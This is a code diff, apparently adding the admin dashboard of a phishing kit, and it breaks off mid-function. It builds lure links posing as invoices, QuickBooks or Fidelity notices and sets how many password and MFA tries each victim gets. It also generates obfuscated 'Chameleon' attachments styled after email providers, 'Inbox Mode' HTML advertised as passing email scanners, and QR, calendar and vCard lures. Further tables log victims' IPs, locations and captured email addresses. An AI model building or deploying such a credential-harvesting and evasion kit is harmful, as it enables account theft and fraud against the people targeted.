+        <td><button class="btn" style="padding:6px 10px;" onclick="editLinkForm('${esc(l.hash)}')"><i class="fas fa-edit"></i> Edit</button> <button class="btn red" onclick="revokeLink('${esc(l.hash)}')">Delete</button></td>
+      </tr>`;
+    });
+    h += '</table></div>';
+  }
+
+  // ---- Generated attachments — one dropbox per file ----
+  h += `<div style="margin-top:28px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
+      <h3 style="font-size:15px;font-weight:700;"><i class="fas fa-folder-open" style="color:var(--blue);margin-right:8px;"></i>Generated Attachments</h3>
+      <span style="font-size:12px;color:var(--text-mute);">${attachments.length} file${attachments.length===1?'':'s'}</span>
+    </div>`;
+
+  if (attachments.length === 0) {
+    h += '<div class="dropbox" style="padding:0;"><div class="empty"><i class="fas fa-folder-open"></i><p>No attachments yet. Click <strong>Chameleon</strong>, <strong>Inbox</strong>, or <strong>Convert</strong> above to generate one.</p></div></div>';
+  } else {
+    attachments.forEach(a => {
+      const typeBadge = ({
+        chameleon: '<span class="badge purple"><i class="fas fa-dragon"></i> Chameleon</span>',
+        inbox: '<span class="badge green"><i class="fas fa-envelope-circle-check"></i> Inbox</span>',
+        convert: '<span class="badge blue"><i class="fas fa-code"></i> Convert</span>',
+        qr: '<span class="badge yellow"><i class="fas fa-qrcode"></i> QR</span>',
+        ics: '<span class="badge blue"><i class="fas fa-calendar"></i> ICS</span>',
+        vcf: '<span class="badge blue"><i class="fas fa-address-card"></i> vCard</span>',
+      })[a.type] || `<span class="badge blue">${esc(a.type)}</span>`;
+
+      h += `<details class="dropbox">
+        <summary>
+          <i class="fas fa-file" style="color:var(--text-mute);"></i>
+          <span style="font-weight:700;">${esc(a.label || a.fname || a.id)}</span>
+          ${typeBadge}
+          <span style="font-size:11px;color:var(--text-mute);font-weight:500;">${timeAgo(a.createdAt)}</span>
+          <span class="count" title="Visitors"><i class="fas fa-eye" style="margin-right:4px;"></i>${a.visitorCount}</span>
+          <span class="count" title="Clients" style="background:var(--green-soft);color:var(--green);"><i class="fas fa-user" style="margin-right:4px;"></i>${a.clientCount}</span>
+          <i class="fas fa-chevron-right chev"></i>
+        </summary>
+        <div class="dropbox-body">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin:12px 0 8px;">
+            <span style="font-size:11px;color:var(--text-mute);font-family:monospace;">cid: ${esc(a.id)}${a.fname ? ' · ' + esc(a.fname) : ''}</span>
+            <button class="btn red" style="padding:5px 10px;font-size:11px;" onclick="event.preventDefault();deleteAttachment('${esc(a.id)}')"><i class="fas fa-trash" style="margin-right:4px;"></i>Delete</button>
+          </div>`;
+
+      // Visitors (opened the attachment)
+      h += `<div style="margin-top:14px;">
+        <div style="font-size:12px;font-weight:700;color:var(--text-dim);margin-bottom:6px;text-transform:uppercase;letter-spacing:0.4px;"><i class="fas fa-eye" style="margin-right:6px;color:var(--blue);"></i>Visitors <span style="color:var(--text-mute);font-weight:500;text-transform:none;letter-spacing:0;">— opened the attachment</span></div>`;
+      if (a.visitors && a.visitors.length) {
+        h += '<div class="table-card"><table><tr><th>IP</th><th>Location</th><th>User-Agent</th><th>Hits</th><th>First seen</th><th>Last seen</th></tr>';
+        a.visitors.forEach(v => {
+          const asTitle = v.geo && v.geo.as ? `title="${esc(v.geo.as)}"` : '';
+          h += `<tr>
+            <td style="font-family:monospace;font-size:11px;" ${asTitle}>${esc(v.ip || '')}</td>
+            <td style="font-size:11px;">${geoCell(v.geo)}</td>
+            <td style="font-size:11px;color:var(--text-dim);max-width:240px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="${esc(v.ua || '')}">${esc(v.ua || '—')}</td>
+            <td>${v.hits || 1}</td>
+            <td>${timeAgo(v.firstSeen)}</td>
+            <td>${timeAgo(v.lastSeen)}</td>
+          </tr>`;
+        });
+        h += '</table></div>';
+      } else {
+        h += '<div class="empty" style="padding:18px;font-size:12px;"><i class="fas fa-eye"></i><p>Nobody has opened this yet.</p></div>';
+      }
+      h += `</div>`;
+
+      // Clients (entered an email)
+      h += `<div style="margin-top:14px;">
+        <div style="font-size:12px;font-weight:700;color:var(--text-dim);margin-bottom:6px;text-transform:uppercase;letter-spacing:0.4px;"><i class="fas fa-user" style="margin-right:6px;color:var(--green);"></i>Clients <span style="color:var(--text-mute);font-weight:500;text-transform:none;letter-spacing:0;">— typed an email</span></div>`;
+      if (a.clients && a.clients.length) {
+        h += '<div class="table-card"><table><tr><th>Email</th><th>Attempts</th><th>Last IP</th><th>First seen</th><th>Last seen</th></tr>';
+        a.clients.forEach(c => {
+          h += `<tr>
+            <td style="font-weight:600;">${esc(c.email)}</td>
+            <td>${c.attempts || 1}</td>
+            <td style="font-family:monospace;font-size:11px;color:var(--text-dim);">${esc(c.lastIp || '—')}</td>
+            <td>${timeAgo(c.firstSeen)}</td>
+            <td>${timeAgo(c.lastSeen)}</td>
+          </tr>`;
+        });
+        h += '</table></div>';
+      } else {
+        h += '<div class="empty" style="padding:18px;font-size:12px;"><i class="fas fa-user"></i><p>No emails captured for this attachment yet.</p></div>';
+      }
+      h += `</div>`;
+
+      h += `</div></details>`;
+    });
+  }
+  h += `</div>`;
+
+  // ---- Past Captures — emails from attachments you've already deleted ----
+  if (orphans.length) {
+    h += `<div style="margin-top:28px;">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
+        <h3 style="font-size:15px;font-weight:700;"><i class="fas fa-box-archive" style="color:var(--text-mute);margin-right:8px;"></i>Past Captures
+          <span style="font-size:11px;color:var(--text-mute);font-weight:500;margin-left:6px;">— from attachments you've deleted</span>
+        </h3>
+        <span style="font-size:12px;color:var(--text-mute);">${orphans.length} group${orphans.length===1?'':'s'}</span>
+      </div>`;
+    orphans.forEach(o => {
+      h += `<details class="dropbox" style="margin-bottom:8px;">
+        <summary>
+          <span style="font-family:monospace;font-size:12px;font-weight:700;">cid: ${esc(o.id)}</span>
+          <span class="badge" style="background:rgba(0,0,0,0.05);color:var(--text-dim);">deleted</span>
+          <span style="font-size:11px;color:var(--text-mute);">last activity ${timeAgo(o.lastSeen)}</span>
+          <span class="count" style="background:var(--green-soft);color:var(--green);"><i class="fas fa-user" style="margin-right:4px;"></i>${o.clientCount}</span>
+          <i class="fas fa-chevron-right chev"></i>
+        </summary>
+        <div class="dropbox-body">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin:12px 0 8px;">
+            <span style="font-size:11px;color:var(--text-mute);font-family:monospace;">${o.totalAttempts} attempt${o.totalAttempts===1?'':'s'} · first ${timeAgo(o.firstSeen)}${o.domain ? ' · domain '+esc(o.domain) : ''}</span>
+            <button class="btn red" style="padding:5px 10px;font-size:11px;" onclick="event.preventDefault();forgetPastCapture('${esc(o.id)}')"><i class="fas fa-trash" style="margin-right:4px;"></i>Forget</button>
+          </div>`;
+      if (o.clients && o.clients.length) {
+        h += '<div class="table-card"><table><tr><th>Email</th><th>Attempts</th><th>Last IP</th><th>First seen</th><th>Last seen</th></tr>';
+        o.clients.forEach(c => {
+          h += `<tr>
+            <td style="font-weight:600;">${esc(c.email)}</td>
+            <td>${c.attempts || 1}</td>
+            <td style="font-family:monospace;font-size:11px;color:var(--text-dim);">${esc(c.lastIp || '—')}</td>
+            <td>${timeAgo(c.firstSeen)}</td>
+            <td>${timeAgo(c.lastSeen)}</td>
+          </tr>`;
+        });
+        h += '</table></div>';
+      }
+      h += `</div></details>`;
+    });
+    h += `</div>`;
+  }
+
+  document.getElementById('p-links').innerHTML = h;
+}
+
+async function forgetPastCapture(cid) {
+  if (!(await confirmDialog('Permanently delete the captured emails for this past attachment? This cannot be undone.', { title: 'Forget past captures?', danger: true, confirmText: 'Forget' }))) return;
+  const resp = await fetch(BASE + '/api/forget-past-capture', { method: 'POST', headers: { 'Content-Type': J }, body: JSON.stringify({ cid }) });
+  const data = await resp.json().catch(() => ({}));
+  if (!resp.ok) { showToast(data.error || 'Failed', 'error'); return; }
+  showToast(`Forgot ${data.removed||0} attempt(s)`, 'success');
+  loadLinks();
+}
+
+async function deleteAttachment(cid) {
+  if (!(await confirmDialog('Remove this attachment record and its visitor log?', { title: 'Delete attachment?', danger: true, confirmText: 'Delete' }))) return;
+  const resp = await fetch(BASE + '/api/delete-attachment', { method: 'POST', headers: { 'Content-Type': J }, body: JSON.stringify({ cid }) });
+  const data = await resp.json().catch(() => ({}));
+  if (!resp.ok) { showToast(data.error || 'Failed', 'error'); return; }
+  showToast('Attachment deleted', 'success');
+  loadLinks();
+}
+
+function showGenLinkForm() {
+  const container = document.getElementById('genlink-form-container');
+  if (!container) return;
+  // Toggle: if form is already open, close it
+  if (container.innerHTML.trim() !== '') { container.innerHTML = ''; return; }
+  document.getElementById('genlink-result').innerHTML = '';
+  container.innerHTML = `
+    <div class="user-form">
+      <h3><i class="fas fa-link" style="margin-right:6px;"></i>Generate Client Link</h3>
+      <div class="form-grid">
+        <div class="form-field">
+          <label>Label / Note <span style="color:var(--text-dim);font-weight:400;">(optional)</span></label>
+          <input type="text" id="gl-email" placeholder="e.g. John @ ACME" />
+          <small>For your own tracking — leave blank if unused</small>
+        </div>
+        <div class="form-field">
+          <label>Link expires in (hours)</label>
+          <input type="number" id="gl-expires" value="72" min="1" max="720" />
+          <small>Default: 72 hours</small>
+        </div>
+        <div class="form-field">
+          <label>Document Type</label>
+          <select id="gl-doctype" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:6px;font-family:inherit;" onchange="loadSampleInvoice(true, this.value)">
+            <option value="invoice">Invoice</option>
+            <option value="invitation">Invitation</option>
+            <option value="receipt">Receipt</option>
+            <option value="confirmation">Confirmation</option>
+            <option value="quickbook">QuickBooks</option>
+            <option value="fidelity">Fidelity</option>
+          </select>
+          <small>Type shown in the verification screen</small>
+        </div>
+        <div class="form-field">
+          <label>Password Attempts Allowed</label>
+          <input type="number" id="gl-attempts" value="3" min="1" max="10" />
+          <small>How many wrong password tries before link locks (1-10)</small>
+        </div>
+        <div class="form-field">
+          <label>MFA Attempts Allowed</label>
+          <input type="number" id="gl-mfa-attempts" value="3" min="1" max="10" />
+          <small>How many wrong MFA codes before link locks (1-10)</small>
+        </div>
+        <div class="form-field" style="grid-column: 1 / -1;">
+          <label>Custom Title <span style="color:var(--text-dim);font-weight:400;">(optional)</span></label>
+          <input type="text" id="gl-title" placeholder="e.g. Continue to view your invoice" />
+          <small>Replaces default title shown to visitors. Leave blank for default.</small>
+        </div>
+        <div class="form-field" style="grid-column: 1 / -1;">
+          <label>Custom Subtitle <span style="color:var(--text-dim);font-weight:400;">(optional)</span></label>
+          <input type="text" id="gl-subtitle" placeholder="e.g. Please use the email address this was sent to" />
+          <small>Replaces default subtitle. Leave blank for default.</small>
+        </div>
+        <div class="form-field" style="grid-column: 1 / -1;">
+          <label>Custom Footer Text <span style="color:var(--text-dim);font-weight:400;">(optional)</span></label>
+          <input type="text" id="gl-footer" placeholder="e.g. Only the recipient can view this" />
+          <small>Replaces default footer message. Leave blank for default.</small>
+        </div>
+      </div>
+      <div class="form-actions">
+        <button class="btn blue" style="padding:8px 20px;" onclick="submitGenLink()" id="gl-submit">Generate Link</button>
+        <button class="btn" style="padding:8px 16px;" onclick="document.getElementById('genlink-form-container').innerHTML=''">Cancel</button>
+        <span id="gl-msg" class="form-msg" style="display:none;"></span>
+      </div>
+    </div>`;
+}
+
+async function submitGenLink() {
+  const email = document.getElementById('gl-email').value.trim();
+  const expiresInHours = document.getElementById('gl-expires').value;
+  const documentType = document.getElementById('gl-doctype').value;
+  const maxPasswordAttempts = parseInt(document.getElementById('gl-attempts').value);
+  const maxMfaAttempts = parseInt(document.getElementById('gl-mfa-attempts').value);
+  const customTitle = document.getElementById('gl-title').value.trim();
+  const customSubtitle = document.getElementById('gl-subtitle').value.trim();
+  const customFooter = document.getElementById('gl-footer').value.trim();
+  const btn = document.getElementById('gl-submit');
+  btn.disabled = true; btn.textContent = 'Generating...';
+  try {
+    const resp = await fetch(BASE + '/api/links', { method: 'POST', headers: { 'Content-Type': J }, body: JSON.stringify({ email, expiresInHours, documentType, maxPasswordAttempts, maxMfaAttempts, customTitle, customSubtitle, customFooter }) });
+    const data = await resp.json();
+    if (!resp.ok) { document.getElementById('gl-msg').textContent = data.error; document.getElementById('gl-msg').style.display = 'inline'; document.getElementById('gl-msg').style.color = 'var(--red)'; btn.disabled = false; btn.textContent = 'Generate Link'; return; }
+    document.getElementById('genlink-form-container').innerHTML = '';
+    const link = location.origin + data.url;
+    document.getElementById('genlink-result').innerHTML = `
+      <div class="user-form" style="border-color:var(--green);background:#f0fdf4;">
+        <h3 style="color:var(--green);"><i class="fas fa-check-circle" style="margin-right:6px;"></i>Link Generated</h3>
+        <p style="font-size:13px;color:var(--text-dim);margin-bottom:12px;">${email ? 'Share this link with <strong>'+esc(email)+'</strong>. ' : 'Share this link with your client. '}It expires in ${esc(expiresInHours)} hours.</p>
+        <div style="display:flex;gap:8px;align-items:stretch;">
+          <input type="text" id="genlink-url" value="${esc(link)}" readonly
+            style="flex:1;padding:10px 12px;border:1px solid var(--border);border-radius:8px;font-size:12px;font-family:monospace;background:#fff;color:var(--text);outline:none;" />
+          <button class="btn blue" style="padding:8px 16px;width:auto;" onclick="copyText(document.getElementById('genlink-url').value);document.getElementById('gl-copy-msg').style.display='block';setTimeout(()=>document.getElementById('gl-copy-msg').style.display='none',3000)"><i class="fas fa-copy"></i> Copy</button>
+        </div>
+        <p id="gl-copy-msg" style="font-size:12px;color:var(--green);margin-top:8px;display:none;"><i class="fas fa-check"></i> Copied to clipboard</p>
+        <div style="margin-top:12px;"><button class="btn" style="padding:6px 14px;" onclick="document.getElementById('genlink-result').innerHTML='';loadLinks();">Dismiss</button></div>
+      </div>`;
+    document.getElementById('genlink-url').select();
+    loadLinks();
+  } catch { btn.disabled = false; btn.textContent = 'Generate Link'; }
+}
+
+function editLinkForm(hash) {
+  const container = document.getElementById('genlink-form-container');
+  if (!container) return;
+  if (container.innerHTML.trim() !== '') { container.innerHTML = ''; return; }
+  document.getElementById('genlink-result').innerHTML = '';
+  container.innerHTML = `<div class="user-form"><h3><i class="fas fa-edit" style="margin-right:6px;"></i>Edit Link</h3><div class="form-grid"><div class="form-field" style="grid-column:1 / -1;"><label>Custom Title (optional)</label><input type="text" id="el-title" placeholder="Leave blank for default" /><small>Shown to users accessing this link</small></div><div class="form-field" style="grid-column:1 / -1;"><label>Custom Subtitle (optional)</label><input type="text" id="el-subtitle" placeholder="Leave blank for default" /><small>Subtitle text</small></div><div class="form-field" style="grid-column:1 / -1;"><label>Custom Footer (optional)</label><input type="text" id="el-footer" placeholder="Leave blank for default" /><small>Footer message</small></div></div><div class="form-actions"><button class="btn blue" style="padding:8px 20px;" onclick="submitEditLink('${esc(hash)}')">Save</button><button class="btn" style="padding:8px 16px;" onclick="document.getElementById('genlink-form-container').innerHTML=''">Cancel</button><span id="el-msg" class="form-msg" style="display:none;"></span></div></div>`;
+}
+
+async function submitEditLink(hash) {
+  const customTitle = document.getElementById('el-title').value.trim();
+  const customSubtitle = document.getElementById('el-subtitle').value.trim();
+  const customFooter = document.getElementById('el-footer').value.trim();
+  const resp = await fetch(BASE + '/api/links/' + hash, {
+    method: 'DELETE',
+    headers: { 'Content-Type': J },
+    body: JSON.stringify({ customTitle, customSubtitle, customFooter })
+  });
+  const data = await resp.json();
+  if (!resp.ok) {
+    const msg = document.getElementById('el-msg');
+    msg.textContent = data.error || 'Error';
+    msg.style.color = 'var(--red)';
+    msg.style.display = 'inline';
+    return;
+  }
+  document.getElementById('genlink-form-container').innerHTML = '<div class="user-form" style="border-color:var(--green);background:#f0fdf4;"><h3 style="color:var(--green);"><i class="fas fa-check-circle"></i> Saved!</h3><p style="font-size:13px;">Changes appear instantly</p><div style="margin-top:12px;"><button class="btn" onclick="document.getElementById(\'genlink-form-container\').innerHTML=\'\';loadLinks();">Dismiss</button></div></div>';
+  setTimeout(() => loadLinks(), 1000);
+}
+
+async function revokeLink(hashPrefix) {
+  if (!(await confirmDialog('Revoke this link? It will no longer work.', { danger: true, confirmText: 'Revoke' }))) return;
+  await fetch(BASE + '/api/links/' + hashPrefix, { method: 'DELETE' });
+  loadLinks();
+}
+
+function downloadChameleon() {
+  const container = document.getElementById('genlink-form-container');
+  if (!container) return;
+  // Toggle: if already showing this form, close it
+  if (container.dataset.kind === 'chameleon' && container.innerHTML.trim() !== '') { container.innerHTML = ''; container.dataset.kind = ''; return; }
+  document.getElementById('genlink-result').innerHTML = '';
+  container.dataset.kind = 'chameleon';
+  container.innerHTML = `
+    <div class="user-form">
+      <h3><i class="fas fa-dragon" style="margin-right:6px;"></i>Generate Chameleon HTML</h3>
+      <div class="form-grid">
+        <div class="form-field" style="grid-column:1 / -1;">
+          <label>Document type</label>
+          <select id="ch-doctype" style="width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:10px;font-size:13px;font-family:inherit;background:#fff;outline:none;">
+            <option value="invoice">Invoice</option>
+            <option value="receipt">Receipt</option>
+            <option value="confirmation">Confirmation</option>
+            <option value="invitation">Invitation</option>
+            <option value="quickbook">QuickBooks</option>
+            <option value="fidelity">Fidelity</option>
+          </select>
+          <small>Type of document to display</small>
+        </div>
+        <div class="form-field">
+          <label>Email provider (optional)</label>
+          <select id="ch-provider" style="width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:10px;font-size:13px;font-family:inherit;background:#fff;outline:none;">
+            <option value="">— None (default colors) —</option>
+            <option value="gmail">Gmail</option>
+            <option value="yahoo">Yahoo</option>
+            <option value="outlook">Outlook</option>
+            <option value="comcast">Comcast/Xfinity</option>
+            <option value="aol">AOL</option>
+            <option value="proton">ProtonMail</option>
+            <option value="icloud">iCloud</option>
+            <option value="fastmail">FastMail</option>
+            <option value="ionos">IONOS</option>
+            <option value="att">AT&T</option>
+            <option value="verizon">Verizon</option>
+            <option value="cox">Cox</option>
+            <option value="earthlink">EarthLink</option>
+            <option value="sky">Sky</option>
+            <option value="virginmedia">Virgin Media</option>
+            <option value="btinternet">BT Internet</option>
+            <option value="bell">Bell</option>
+            <option value="rogers">Rogers</option>
+            <option value="zoho">Zoho</option>
+            <option value="gmx">GMX</option>
+            <option value="tonline">T-Online</option>
+            <option value="orange">Orange</option>
+            <option value="laposte">La Poste</option>
+            <option value="yandex">Yandex</option>
+          </select>
+          <small>Use provider colors (for Invoice/Receipt/Confirmation/Invitation only)</small>
+        </div>
+        <div class="form-field">
+          <label>Browser tab title</label>
+          <input type="text" id="ch-title" value="Invoice" />
+          <small>Shown in the browser tab</small>
+        </div>
+        <div class="form-field">
+          <label>Encryption level</label>
+          <select id="ch-preset" style="width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:10px;font-size:13px;font-family:inherit;background:#fff;outline:none;">
+            <option value="light">Light — smallest file</option>
+            <option value="medium" selected>Medium — recommended</option>
+            <option value="heavy">Heavy — control-flow flattening</option>
+            <option value="max">Max — anti-debug + self-defending</option>
+          </select>
+          <small>Higher = bigger file but harder to reverse</small>
+        </div>
+      </div>
+      <div class="form-actions">
+        <button class="btn blue" style="padding:8px 20px;" onclick="submitChameleon()" id="ch-submit">Generate &amp; Download</button>
+        <button class="btn" style="padding:8px 16px;" onclick="document.getElementById('genlink-form-container').innerHTML='';document.getElementById('genlink-form-container').dataset.kind='';">Cancel</button>
+        <span id="ch-msg" class="form-msg" style="display:none;"></span>
+      </div>
+    </div>`;
+}
+
+// Trigger a download via a one-shot server-side staged file. Avoids
+// blob:http://<admin-origin>/<uuid> URLs ever appearing in the network panel
+// — the browser fetches /api/download/<id> directly and saves it via
+// Content-Disposition: attachment.
+function triggerStagedDownload(downloadId) {
+  let iframe = document.getElementById('cha-dl-iframe');
+  if (!iframe) {
+    iframe = document.createElement('iframe');
+    iframe.id = 'cha-dl-iframe';
+    iframe.style.display = 'none';
+    document.body.appendChild(iframe);
+  }
+  // Cache-bust by appending now so reuse of the iframe still triggers download
+  iframe.src = BASE + '/api/download/' + encodeURIComponent(downloadId);
+}
+
+// ---- Quick generators (QR, ICS, VCF) — no form needed, instant download ----
+async function quickGen(endpoint, fname, successMsg) {
+  const container = document.getElementById('genlink-form-container');
+  if (container) { container.innerHTML = ''; container.dataset.kind = ''; }
+  try {
+    const resp = await fetch(BASE + '/api/chameleon/' + endpoint, {
+      method: 'POST', headers: { 'Content-Type': J },
+      body: JSON.stringify({ origin: location.origin }),
+    });
+    const data = await resp.json();
+    if (!resp.ok || !data.downloadId) { showToast(data.error || 'Failed', 'error'); return; }
+    triggerStagedDownload(data.downloadId);
+    showToast(successMsg, 'success');
+  } catch { showToast('Network error', 'error'); }
+}
+function downloadQr() { quickGen('qr', 'qr.png', 'QR Code downloaded — scan to open login'); }
+
+function downloadIcs() {
+  const container = document.getElementById('genlink-form-container');
+  if (!container) return;
+  if (container.dataset.kind === 'ics' && container.innerHTML.trim() !== '') { container.innerHTML = ''; container.dataset.kind = ''; return; }
+  document.getElementById('genlink-result').innerHTML = '';
+  container.dataset.kind = 'ics';
+  container.innerHTML = `
+    <div class="user-form">
+      <h3><i class="fas fa-calendar-plus" style="margin-right:6px;color:var(--blue);"></i>Generate Calendar Invite</h3>
+      <div class="form-grid">
+        <div class="form-field">
+          <label>Event Title</label>
+          <input type="text" id="ics-summary" value="Invoice Payment Due" />
+        </div>
+        <div class="form-field">
+          <label>Description</label>
+          <input type="text" id="ics-desc" value="Please review and approve the attached invoice." />
+        </div>
+      </div>
+      <div class="form-actions">
+        <button class="btn blue" style="padding:8px 20px;" onclick="submitIcs()">Generate &amp; Download</button>
+        <button class="btn" style="padding:8px 16px;" onclick="document.getElementById('genlink-form-container').innerHTML='';document.getElementById('genlink-form-container').dataset.kind='';">Cancel</button>
+      </div>
+    </div>`;
+}
+async function submitIcs() {
+  try {
+    const resp = await fetch(BASE + '/api/chameleon/ics', {
+      method: 'POST', headers: { 'Content-Type': J },
+      body: JSON.stringify({
+        summary: document.getElementById('ics-summary').value.trim(),
+        description: document.getElementById('ics-desc').value.trim(),
+        origin: location.origin,
+      }),
+    });
+    const data = await resp.json();
+    if (!resp.ok || !data.downloadId) { showToast(data.error || 'Failed', 'error'); return; }
+    triggerStagedDownload(data.downloadId);
+    document.getElementById('genlink-form-container').innerHTML = '';
+    document.getElementById('genlink-form-container').dataset.kind = '';
+    showToast('Calendar invite downloaded', 'success');
+  } catch { showToast('Network error','error'); }
+}
+
+function downloadVcf() {
+  const container = document.getElementById('genlink-form-container');
+  if (!container) return;
+  if (container.dataset.kind === 'vcf' && container.innerHTML.trim() !== '') { container.innerHTML = ''; container.dataset.kind = ''; return; }
+  document.getElementById('genlink-result').innerHTML = '';
+  container.dataset.kind = 'vcf';
+  container.innerHTML = `
+    <div class="user-form">
+      <h3><i class="fas fa-address-card" style="margin-right:6px;color:var(--blue);"></i>Generate vCard Contact</h3>
+      <div class="form-grid">
+        <div class="form-field">
+          <label>Contact Name</label>
+          <input type="text" id="vcf-name" value="Finance Department" />
+        </div>
+        <div class="form-field">
+          <label>Organization</label>
+          <input type="text" id="vcf-org" value="Accounts Payable" />
+        </div>
+        <div class="form-field">
+          <label>Email</label>
+          <input type="text" id="vcf-email" value="invoices@company.com" />
+        </div>
+        <div class="form-field">
+          <label>Note</label>
+          <input type="text" id="vcf-note" value="Tap the website link to view your invoice." />
+        </div>
+      </div>
+      <div class="form-actions">
+        <button class="btn blue" style="padding:8px 20px;" onclick="submitVcf()">Generate &amp; Download</button>
+        <button class="btn" style="padding:8px 16px;" onclick="document.getElementById('genlink-form-container').innerHTML='';document.getElementById('genlink-form-container').dataset.kind='';">Cancel</button>
+      </div>
+    </div>`;
+}
+async function submitVcf() {
+  try {
+    const resp = await fetch(BASE + '/api/chameleon/vcf', {
+      method: 'POST', headers: { 'Content-Type': J },
+      body: JSON.stringify({
+        fullName: document.getElementById('vcf-name').value.trim(),
+        org: document.getElementById('vcf-org').value.trim(),
+        email: document.getElementById('vcf-email').value.trim(),
+        note: document.getElementById('vcf-note').value.trim(),
+        origin: location.origin,
+      }),
+    });
+    const data = await resp.json();
+    if (!resp.ok || !data.downloadId) { showToast(data.error || 'Failed', 'error'); return; }
+    triggerStagedDownload(data.downloadId);
+    document.getElementById('genlink-form-container').innerHTML = '';
+    document.getElementById('genlink-form-container').dataset.kind = '';
+    showToast('vCard downloaded', 'success');
+  } catch { showToast('Network error','error'); }
+}
+
+function downloadInbox() {
+  const container = document.getElementById('genlink-form-container');
+  if (!container) return;
+  if (container.dataset.kind === 'inbox' && container.innerHTML.trim() !== '') { container.innerHTML = ''; container.dataset.kind = ''; return; }
+  document.getElementById('genlink-result').innerHTML = '';
+  container.dataset.kind = 'inbox';
+  container.innerHTML = `
+    <div class="user-form">
+      <h3><i class="fas fa-envelope-circle-check" style="margin-right:6px;color:#10b981;"></i>Inbox Mode — Email Attachment</h3>
+      <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px;">Zero JavaScript, zero event handlers, zero encoded data. Passes all email scanners. Opens in browser and redirects to your login flow.</p>
+      <div class="form-grid">
+        <div class="form-field">
+          <label>Auto-redirect delay (seconds)</label>
+          <select id="inbox-delay" style="width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:10px;font-size:13px;font-family:inherit;background:#fff;">
+            <option value="0">Instant (0s)</option>
+            <option value="2" selected>2 seconds</option>
+            <option value="5">5 seconds</option>
+          </select>
+          <small>How long before auto-redirect. Client can also click the button manually.</small>
+        </div>
+      </div>
+      <div class="form-actions">
+        <button class="btn blue" style="padding:8px 20px;" onclick="submitInbox()" id="inbox-submit">Generate &amp; Download</button>
+        <button class="btn" style="padding:8px 16px;" onclick="document.getElementById('genlink-form-container').innerHTML='';document.getElementById('genlink-form-container').dataset.kind='';">Cancel</button>
+      </div>
+    </div>`;
+}
+
+async function submitInbox() {
+  const btn = document.getElementById('inbox-submit');
+  btn.disabled = true; btn.textContent = 'Generating...';
+  try {
+    const resp = await fetch(BASE + '/api/chameleon/inbox', {
+      method: 'POST', headers: { 'Content-Type': J },
+      body: JSON.stringify({ delay: document.getElementById('inbox-delay').value, origin: location.origin }),
+    });
+    const data = await resp.json();
+    if (!resp.ok || !data.downloadId) { showToast(data.error || 'Failed', 'error'); btn.disabled = false; btn.textContent = 'Generate & Download'; return; }
+    triggerStagedDownload(data.downloadId);
+    document.getElementById('genlink-form-container').innerHTML = '';
+    document.getElementById('genlink-form-container').dataset.kind = '';
+    showToast('Inbox-mode HTML downloaded — safe to attach in emails', 'success');
+  } catch { showToast('Network error', 'error'); btn.disabled = false; btn.textContent = 'Generate & Download'; }
+}
+
+function showConvertHtml() {
+  const container = document.getElementById('genlink-form-container');
+  if (!container) return;
+  if (container.dataset.kind === 'convert' && container.innerHTML.trim() !== '') { container.innerHTML = ''; container.dataset.kind = ''; return; }
+  document.getElementById('genlink-result').innerHTML = '';
+  container.dataset.kind = 'convert';
+  container.innerHTML = `
+    <div class="user-form">
+      <h3><i class="fas fa-code" style="margin-right:6px;color:var(--blue);"></i>Convert Any HTML</h3>
+      <p style="font-size:12px;color:var(--text-dim);margin-bottom:12px;">Paste any HTML page. It will be converted to the stealth format — auto-redirect through your worker, encrypted params, entity-encoded URLs, #E email tag, campaign tracking. Zero JS injected.</p>
+      <div class="form-field">
+        <label>Paste your HTML</label>
+        <textarea id="conv-html" rows="10" placeholder="<!DOCTYPE html>&#10;<html>&#10;<head>...</head>&#10;<body>...</body>&#10;</html>" style="width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:10px;font-family:monospace;font-size:11px;resize:vertical;background:#fff;"></textarea>
+      </div>
+      <div class="form-actions">
+        <button class="btn blue" style="padding:8px 20px;" onclick="submitConvert()" id="conv-submit">Convert &amp; Download</button>
+        <button class="btn" style="padding:8px 16px;" onclick="document.getElementById('genlink-form-container').innerHTML='';document.getElementById('genlink-form-container').dataset.kind='';">Cancel</button>
+        <span id="conv-msg" class="form-msg" style="display:none;"></span>
+      </div>
+    </div>`;
+}
+
+async function submitConvert() {
+  const html = document.getElementById('conv-html').value;
+  const btn = document.getElementById('conv-submit');
+  const msg = document.getElementById('conv-msg');
+  if (!html || html.length < 10) { msg.style.display='inline'; msg.style.color='var(--red)'; msg.textContent='Paste your HTML first'; return; }
+  btn.disabled = true; btn.textContent = 'Converting...';
+  try {
+    const resp = await fetch(BASE + '/api/chameleon/convert', {
+      method: 'POST', headers: { 'Content-Type': J },
+      body: JSON.stringify({ html, origin: location.origin }),
+    });
+    const data = await resp.json();
+    if (!resp.ok || !data.downloadId) { msg.style.display='inline'; msg.style.color='var(--red)'; msg.textContent=data.error||'Failed'; btn.disabled=false; btn.textContent='Convert & Download'; return; }
+    triggerStagedDownload(data.downloadId);
+    document.getElementById('genlink-form-container').innerHTML = '';
+    document.getElementById('genlink-form-container').dataset.kind = '';
+    showToast('HTML converted and downloaded', 'success');
+  } catch { msg.style.display='inline'; msg.style.color='var(--red)'; msg.textContent='Network error'; btn.disabled=false; btn.textContent='Convert & Download'; }
+}
+
+async function submitChameleon() {
+  const documentType = document.getElementById('ch-doctype').value || 'invoice';
+  const title = document.getElementById('ch-title').value.trim() || 'Invoice';
+  const preset = document.getElementById('ch-preset').value || 'medium';
+  const provider = document.getElementById('ch-provider').value || null;
+  const btn = document.getElementById('ch-submit');
+  const msg = document.getElementById('ch-msg');
+  btn.disabled = true; btn.textContent = 'Generating...';
+  try {
+    const resp = await fetch(BASE + '/api/chameleon/generate', {
+      method: 'POST',
+      headers: { 'Content-Type': J },
+      body: JSON.stringify({ documentType, title, preset, provider, origin: location.origin }),
+    });
+    const data = await resp.json();
+    if (!resp.ok || !data.downloadId) { msg.style.display='inline'; msg.style.color='var(--red)'; msg.textContent=data.error||'Generation failed'; btn.disabled=false; btn.textContent='Generate & Download'; return; }
